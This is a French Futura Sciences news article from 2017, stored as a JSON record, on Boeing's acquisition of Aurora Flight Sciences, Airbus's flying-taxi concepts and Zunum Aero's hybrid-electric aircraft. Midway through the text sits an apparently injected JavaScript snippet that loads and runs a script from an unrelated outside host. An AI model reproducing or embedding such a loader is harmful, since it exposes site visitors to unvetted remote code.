{"title": "Taxis volants électriques : Boeing et Airbus y pensent très fort", "newspaper": "Futura Sciences", "author": "Jean-Luc Goudet", "date_publi": "11/10/2017", "content": "En absorbant l'entreprise Aurora Flight Science, Boeing s'investit dans le développement de futurs avions autonomes et de taxis volants. Et Zunum Aero, une jeune entreprise soutenue par l'avionneur américain, promet de commercialiser le premier avion hybride électrique en 2022. Airbus n'est pas en reste. Attachons nos ceintures... Ce qu'il faut retenir Boeing prépare des avions autonomes. Airbus poursuit le développement de ses taxis volants électriques. L’avionneur envisage d'en livrer 50 exemplaires à Uber d'ici 2020. Toujours avec Aurora dont il a fait l’acquisition, Boeing compte bien rattraper son retard dans ce domaine. L’entreprise prépare aussi un avion électrique hybride. Pour éviter d'être dépassé par des  start-up  transformant l'aviation, le constructeur aéronautique Boeing a procédé récemment à une série d'acquisitions stratégiques dont la dernière en date est la société américaine  Aurora  Flight Sciences, spécialisée dans la mise au point de vols autonomes. Aurora, qui travaillait jusqu'ici avec Boeing sur des prototypes d'avions commerciaux et militaires, devrait permettre à l'avionneur de réaliser ses ambitions en  matière  d'avions autonomes et de  drones . « L'industrie aéronautique est en train de changer » , a constaté Greg Hyslop, le responsable des technologies chez Boeing lors d'une conférence téléphonique avec des journalistes, pour expliquer cette offensive tous  azimuts  de l'avionneur. Si les  avions  les plus modernes disposent déjà d'une multitude d' ordinateurs  et de systèmes automatisés permettant de réduire la charge de travail des pilotes, Aurora va plus loin et développe des systèmes automatiques dont le but ultime est un vol complètement autonome, du décollage à l'atterrissage. L'objectif est de parvenir à un  robot  capable, avec l'aide de l' intelligence artificielle , de seconder voire suppléer le pilote. Il pourrait ainsi effectuer différentes manœuvres comme appuyer sur les pédales, prendre le contrôle dans les situations d'urgence, faire atterrir l'avion ou éviter un crash en cas d'avarie ou de défaillance. En mai, Aurora a par exemple collaboré avec la Darpa, la cellule recherche et développement de l'armée américaine, lors d'un test de simulation mettant en scène un robot, Alias ( Aircrew Labor In-Cockpit Automation System ). Ce système, électronique et mécanique, a réussi à faire atterrir sans intervention humaine (entre autres) un 737, un biréacteur de Boeing. Voir aussi : Alias, le robot qui peut piloter n’importe quel avion Le concept Pop.Up d'Airbus (voir plus bas dans le texte) prévoit des habitacles embarqués sur des plateformes roulantes ou volantes à motorisations électriques. L'ensemble mettrait les batteries en réseau pour optimiser les charges en fonction des besoins. © Airbus, Italdesign                               Airbus et Boeing imaginent des taxis volants Aurora devrait également permettre à Boeing de s'aventurer sur le terrain des taxis volants et de rattraper une partie de son retard sur le rival Airbus. L'avionneur européen, en effet, travaille depuis quelque temps avec Uber, qui a promis une flotte de véhicules volants décollant à la verticale d'ici 2026. En avril, elle a fait voler un prototype et envisage d'en livrer 50 exemplaires au service de réservation en ligne de  voitures  sans chauffeur d'ici 2020. Airbus a promis un vol test de Vahana, son taxi volant, d'ici la fin de l'année. En outre, Airbus développe un concept de voiture volante autonome à motorisation électrique,  Pop.UP , destinée aux déplacements interurbains.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Aurora, associé au groupe industriel Honeywell et au motoriste Rolls-Royce, est en train de fabriquer un  avion électrique   hybride  pour le Pentagone. Enfin, Zunum Aero, une jeune pousse dont Boeing est l'un des financiers, s'est engagée à commercialiser le premier avion hybride électrique à partir de 2022. Cet appareil pourra transporter 12 passagers et est destiné aux liaisons courtes. Il sera doté d'un  générateur  électrique à essence et de deux batteries pour une autonomie annoncée de 700 miles (près de 1.130 km). Elles seront identiques à celles utilisées par  Tesla  pour ses  voitures électriques . Sa  vitesse  de croisière maximum sera de 550 km/h et son altitude maximum de 700 mètres, du rase-motte pour un avion de ligne. Il sera censé réduire considérablement le bruit et les  émissions  de CO 2  et faire gagner du temps aux voyageurs car il ne décollera que des petits aéroports, ce qui permettrait d'éviter les longues files d'attente à la sécurité ou les longs trajets vers les aéroports. Un voyage entre Washington et Boston s'effectuera en 2 heures 30 minutes porte-à-porte contre 4 heures 50 minutes actuellement, affirme Zunum Aero. La jeune pousse prévoit de commercialiser d'autres versions par la suite, dont un appareil qui pourra transporter jusqu'à 50 personnes et pourrait parcourir une distance allant jusqu'à 1.000 miles, soit 1.600 km. Avec AFP EHang 184 : ce drone taxi vous emmène partout en un clin d’œil                       L’idée d’un taxi personnel et autonome est séduisante, surtout si celui-ci est capable de voler comme le EHang 184, présenté en 2016. En plus de pouvoir se déplacer rapidement et d’être intégralement électrique, le véhicule ne demande aucune connaissance de pilotage. Le voici présenté en vidéo.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  airbus boeing omc  |  etoile brille tres fort  |  dosage base fort par acide fort  |  boeing 747  |  boeing 797  |  boeing 787  |  boeing biocarburant  |  insectes volants  |  mammiferes volants  |  nid insectes volants", "theme": "sciences"}